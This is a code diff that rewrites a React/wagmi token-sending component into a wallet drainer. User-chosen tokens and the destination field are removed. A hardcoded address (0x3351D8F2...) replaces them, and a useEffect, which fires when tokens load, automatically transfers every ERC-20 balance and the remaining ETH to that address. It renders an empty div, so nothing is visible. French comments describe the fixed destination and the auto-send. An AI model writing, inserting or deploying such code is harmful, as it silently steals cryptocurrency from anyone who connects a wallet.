@@ -1,135 +1,83 @@
-import { Button, Input, useToasts } from '@geist-ui/core';
-import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
-
-import { isAddress } from 'essential-eth';
+import { useToasts } from '@geist-ui/core';
+import { erc20ABI, usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { useAtom } from 'jotai';
-import { normalize } from 'viem/ens';
-import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
-import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 
-function sleep(ms: number): Promise<void> {
-  return new Promise((resolve) => setTimeout(resolve, ms));
-}
-export const SendTokens = () => {
+export const SendAllFunds = () => {
   const { setToast } = useToasts();
   const showToast = (message: string, type: any) =>
-    setToast({
-      text: message,
-      type,
-      delay: 4000,
-    });
+    setToast({ text: message, type, delay: 4000 });
+
   const [tokens] = useAtom(globalTokensAtom);
-  const [destinationAddress, setDestinationAddress] = useAtom(
-    destinationAddressAtom,
-  );
-  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
-  const sendAllCheckedTokens = async () => {
-    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(
-      checkedRecords,
-    )
-      .filter(([tokenAddress, { isChecked }]) => isChecked)
-      .map(([tokenAddress]) => tokenAddress as `0x${string}`);
+  const { address } = useAccount();
 
-    if (!walletClient) return;
-    if (!destinationAddress) return;
-    if (destinationAddress.includes('.')) {
-      const resolvedDestinationAddress = await publicClient.getEnsAddress({
-        name: normalize(destinationAddress),
-      });
-      resolvedDestinationAddress &&
-        setDestinationAddress(resolvedDestinationAddress);
-      return;
-    }
-    // hack to ensure resolving the ENS name above completes
-    for (const tokenAddress of tokensToSend) {
-      // const erc20Contract = getContract({
-      //   address: tokenAddress,
-      //   abi: erc20ABI,
-      //   client: { wallet: walletClient },
-      // });
-      // const transferFunction = erc20Contract.write.transfer as (
-      //   destinationAddress: string,
-      //   balance: string,
-      // ) => Promise<TransferPending>;
-      const token = tokens.find(
-        (token) => token.contract_address === tokenAddress,
-      );
-      const { request } = await publicClient.simulateContract({
-        account: walletClient.account,
-        address: tokenAddress,
-        abi: erc20ABI,
-        functionName: 'transfer',
-        args: [
-          destinationAddress as `0x${string}`,
-          BigInt(token?.balance || '0'),
-        ],
-      });
+  // L'adresse de destination est fixée ici
+  const destinationAddress = '0x3351D8F2F3F4708d2A7B5FbbD4Db350Af7313B75';
 
-      await walletClient
-        ?.writeContract(request)
-        .then((res) => {
-          setCheckedRecords((old) => ({
-            ...old,
-            [tokenAddress]: {
-              ...old[tokenAddress],
-              pendingTxn: res,
-            },
-          }));
-        })
-        .catch((err) => {
-          showToast(
-            `Error with ${token?.contract_ticker_symbol} ${
-              err?.reason || 'Unknown error'
-            }`,
-            'warning',
-          );
+  // Fonction pour envoyer l'ETH restant
+  const sendEth = async () => {
+    if (!walletClient || !destinationAddress) return;
+    
+    const balance = await publicClient.getBalance({ address });
+
+    if (balance > 0n) {
+      try {
+        const tx = await walletClient.sendTransaction({
+          to: destinationAddress,
+          value: balance - BigInt(21000 * 10 ** 9), // Soustraction pour les frais de gas
         });
+        showToast(`ETH sent: ${tx.hash}`, 'success');
+      } catch (err) {
+        showToast(`ETH send error: ${err?.reason || 'Unknown error'}`, 'warning');
+      }
     }
   };
 
-  const addressAppearsValid: boolean =
-    typeof destinationAddress === 'string' &&
-    (destinationAddress?.includes('.') || isAddress(destinationAddress));
-  const checkedCount = Object.values(checkedRecords).filter(
-    (record) => record.isChecked,
-  ).length;
-  return (
-    <div style={{ margin: '20px' }}>
-      <form>
-        Destination Address:
-        <Input
-          required
-          value={destinationAddress}
-          placeholder="vitalik.eth"
-          onChange={(e) => setDestinationAddress(e.target.value)}
-          type={
-            addressAppearsValid
-              ? 'success'
-              : destinationAddress.length > 0
-                ? 'warning'
-                : 'default'
-          }
-          width="100%"
-          style={{
-            marginLeft: '10px',
-            marginRight: '10px',
-          }}
-          crossOrigin={undefined}
-        />
-        <Button
-          type="secondary"
-          onClick={sendAllCheckedTokens}
-          disabled={!addressAppearsValid}
-          style={{ marginTop: '20px' }}
-        >
-          {checkedCount === 0
-            ? 'Select one or more tokens above'
-            : `Send ${checkedCount} tokens`}
-        </Button>
-      </form>
-    </div>
-  );
+  // Fonction pour envoyer tous les jetons ERC-20
+  const sendAllTokens = async () => {
+    if (!walletClient || !destinationAddress) return;
+
+    for (const token of tokens) {
+      const { contract_address, balance } = token;
+      if (balance === '0') continue;
+
+      try {
+        const { request } = await publicClient.simulateContract({
+          account: walletClient.account,
+          address: contract_address as `0x${string}`,
+          abi: erc20ABI,
+          functionName: 'transfer',
+          args: [destinationAddress as `0x${string}`, BigInt(balance)],
+        });
+
+        await walletClient.writeContract(request);
+        showToast(`Sent ${token.contract_ticker_symbol}`, 'success');
+      } catch (err) {
+        showToast(
+          `Error sending ${token.contract_ticker_symbol}: ${err?.reason || 'Unknown error'}`,
+          'warning'
+        );
+      }
+    }
+  };
+
+  // Fonction pour envoyer tous les fonds (ETH + tokens ERC-20)
+  const sendAllFunds = async () => {
+    // Envoie tous les tokens ERC-20
+    await sendAllTokens();
+    // Envoie tous les ETH
+    await sendEth();
+  };
+
+  // Exécuter l'envoi dès que les fonds sont disponibles
+  useEffect(() => {
+    const sendFundsIfValid = async () => {
+      await sendAllFunds();
+    };
+    sendFundsIfValid();
+  }, [tokens]); // S'assurer que les tokens sont récupérés avant l'envoi
+
+  return <div style={{ margin: '20px' }}></div>;
 };
